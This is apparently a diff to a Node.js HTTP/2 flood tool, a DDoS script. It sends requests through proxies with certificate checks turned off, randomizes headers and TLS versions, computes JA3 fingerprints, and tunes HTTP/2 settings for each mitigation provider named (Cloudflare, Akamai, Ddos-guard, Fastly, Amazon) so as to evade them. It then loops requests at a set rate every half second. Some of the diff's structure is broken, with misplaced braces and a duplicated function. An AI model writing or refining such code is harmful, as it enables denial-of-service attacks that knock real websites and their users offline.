+ ['nodejs-c-python-'+ generateRandomString(1,9)]: generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12),	
+
 },
                       dyn2 = {
                         ...(Math.random() < 0.5 ?{"upgrade-insecure-requests": "1"} : {}),
                         ...(Math.random() < 0.5 ? { "purpose": "prefetch"} : {} ),
-                        "RTT" : "1"
-
                       }  
 
 const proxyOptions = {
     host: parsedProxy[0],
     port: ~~parsedProxy[1],
     address: `${parsedTarget.host}:443`,
-    timeout: 10
+    timeout: 5
 };
 
 Socker.HTTP(proxyOptions, async (connection, error) => {
@@ -615,39 +632,43 @@ Socker.HTTP(proxyOptions, async (connection, error) => {
         secureContext: secureContext,
         honorCipherOrder: false,
         rejectUnauthorized: false,
-       secureProtocol: Math.random() < 0.5 ? ['TLSv1.3_method', 'TLSv1.2_method'] : ['TLSv1.3_method'],
+        secureProtocol: Math.random() < 0.5 ? 'TLSv1_3_method' : 'TLSv1_2_method',
         secureOptions: secureOptions,
         host: parsedTarget.host,
         servername: parsedTarget.host,
     };
     
-    const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
-    
+    const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions, () => {
+    const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
     tlsSocket.allowHalfOpen = true;
     tlsSocket.setNoDelay(true);
     tlsSocket.setKeepAlive(true, 60000);
     tlsSocket.setMaxListeners(0);
-    
-    function generateJA3Fingerprint(socket) {
-        const cipherInfo = socket.getCipher();
-        const supportedVersions = socket.getProtocol();
-    
-        if (!cipherInfo) {
-            console.error('Cipher info is not available. TLS handshake may not have completed.');
-            return null;
-        }
-    
-        const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
-    
-        const md5Hash = crypto.createHash('md5');
-        md5Hash.update(ja3String);
-    
-        return md5Hash.digest('hex');
+
+});
+
+function generateJA3Fingerprint(socket) {
+    const cipherInfo = socket.getCipher();
+    const supportedVersions = socket.getProtocol();
+
+    if (!cipherInfo) {
+        console.error('Cipher info is not available. TLS handshake may not have completed.');
+        return null;
     }
-    
-    tlsSocket.on('connect', () => {
-        const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
-    });
+
+    const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
+
+    const md5Hash = crypto.createHash('md5');
+    md5Hash.update(ja3String);
+
+    return md5Hash.digest('hex');
+}
+
+tlsSocket.on('connect', () => {
+    const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
+});
+
+
     function getSettingsBasedOnISP(isp) {
         const defaultSettings = {
             headerTableSize: 65536,
@@ -661,63 +682,90 @@ Socker.HTTP(proxyOptions, async (connection, error) => {
     
         const settings = { ...defaultSettings };
     
-        if (isp === 'Cloudflare, Inc.') {
-            settings.maxConcurrentStreams = Math.random() < 0.5 ? 100 : 1000;
-            settings.initialWindowSize = 65536;
+        switch (isp) {
+        case 'Cloudflare, Inc.':
+            settings.priority = 1;
+            settings.headerTableSize = 65536;
+            settings.maxConcurrentStreams = 1000;
+            settings.initialWindowSize = 6291456;
             settings.maxFrameSize = 16384;
             settings.enableConnectProtocol = false;
-        } else if (['FDCservers.net', 'OVH SAS', 'VNXCLOUD'].includes(isp)) {
+            break;
+        case 'FDCservers.net':
+        case 'OVH SAS':
+        case 'VNXCLOUD':
+            settings.priority = 0;
             settings.headerTableSize = 4096;
             settings.initialWindowSize = 65536;
             settings.maxFrameSize = 16777215;
             settings.maxConcurrentStreams = 128;
             settings.maxHeaderListSize = 4294967295;
-        } else if (['Akamai Technologies, Inc.', 'Akamai International B.V.'].includes(isp)) {
-            settings.headerTableSize = 4096;
-            settings.maxConcurrentStreams = 100;
+            break;
+        case 'Akamai Technologies, Inc.':
+        case 'Akamai International B.V.':
+            settings.priority = 1;
+            settings.headerTableSize = 65536;
+            settings.maxConcurrentStreams = 1000;
             settings.initialWindowSize = 6291456;
             settings.maxFrameSize = 16384;
             settings.maxHeaderListSize = 32768;
-        } else if (['Fastly, Inc.', 'Optitrust GmbH'].includes(isp)) {
+            break;
+        case 'Fastly, Inc.':
+        case 'Optitrust GmbH':
+            settings.priority = 0;
             settings.headerTableSize = 4096;
             settings.initialWindowSize = 65535;
             settings.maxFrameSize = 16384;
             settings.maxConcurrentStreams = 100;
             settings.maxHeaderListSize = 4294967295;
-        } else if (isp === 'Ddos-guard LTD') {
-            settings.maxConcurrentStreams = 8;
+            break;
+        case 'Ddos-guard LTD':
+            settings.priority = 1;
+            settings.maxConcurrentStreams = 1;
             settings.initialWindowSize = 65535;
             settings.maxFrameSize = 16777215;
             settings.maxHeaderListSize = 262144;
-        } else if (['Amazon.com, Inc.', 'Amazon Technologies Inc.'].includes(isp)) {
+            break;
+        case 'Amazon.com, Inc.':
+        case 'Amazon Technologies Inc.':
+            settings.priority = 0;
             settings.maxConcurrentStreams = 100;
             settings.initialWindowSize = 65535;
             settings.maxHeaderListSize = 262144;
-        } else if (['Microsoft Corporation', 'Vietnam Posts and Telecommunications Group', 'VIETNIX'].includes(isp)) {
+            break;
+        case 'Microsoft Corporation':
+        case 'Vietnam Posts and Telecommunications Group':
+        case 'VIETNIX':
+            settings.priority = 0;
             settings.headerTableSize = 4096;
             settings.initialWindowSize = 8388608;
             settings.maxFrameSize = 16384;
             settings.maxConcurrentStreams = 100;
             settings.maxHeaderListSize = 4294967295;
-        } else if (isp === 'Google LLC') {
+            break;
+        case 'Google LLC':
+            settings.priority = 0;
             settings.headerTableSize = 4096;
             settings.initialWindowSize = 1048576;
             settings.maxFrameSize = 16384;
             settings.maxConcurrentStreams = 100;
             settings.maxHeaderListSize = 137216;
-        } else {
+            break;
+        default:
             settings.headerTableSize = 65535;
             settings.maxConcurrentStreams = 1000;
             settings.initialWindowSize = 6291456;
             settings.maxHeaderListSize = 261144;
             settings.maxFrameSize = 16384;
-        }
-    
-        return settings;
+            break;
     }
+
+    return settings;
+}
     
     let hpack = new HPACK();
     let client;
+    
     const clients = [];
     client = http2.connect(parsedTarget.href, {
         protocol: "https",
@@ -739,9 +787,9 @@ Socker.HTTP(proxyOptions, async (connection, error) => {
     client.ping((err, duration, payload) => {
     });
 
-    client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('Client Hello'));
-});
+    client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('NATRAL'));
 
+});
     clients.forEach(client => {
     const intervalId = setInterval(() => {
         async function sendRequests() {
@@ -755,10 +803,14 @@ Socker.HTTP(proxyOptions, async (connection, error) => {
                 keys.forEach(key => shuffledObj[key] = obj[key]);
                 return shuffledObj;
             };
-
             const randomItem = (array) => array[Math.floor(Math.random() * array.length)];
-
             const dynHeaders = shuffleObject({
+            ...(Math.random() < 0.5 && { rhd: [randomItem(rhd)] }),
+                ...(Math.random() < 0.5 && { hd1: [randomItem(hd1)] }),
+                ...randomItem(rateHeaders1),
+                ...randomItem(rateHeaders2),
+                ...randomItem(rateHeaders3),
+                ...randomItem(rateHeaders4),
                 ...dyn,
                 ...allHeaders,
                 ...dyn2,
@@ -776,7 +828,7 @@ Socker.HTTP(proxyOptions, async (connection, error) => {
 
             const increaseRequestRate = async (client, dynHeaders, args) => {
                 if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
-                    for (let i = 0; i < args.Rate; i++) {
+                    for (let i = 0; i < args.Rate ; i++) {
                         const requestPromise = new Promise((resolve, reject) => {
                             const req = client.request(dynHeaders, {
                                 weight: Math.random() < 0.5 ? 251 : 231,
@@ -810,8 +862,7 @@ Socker.HTTP(proxyOptions, async (connection, error) => {
 
             await increaseRequestRate(client, dynHeaders, args);
         }
-
-        sendRequests();
+            sendRequests();
     }, 500);
 });
 
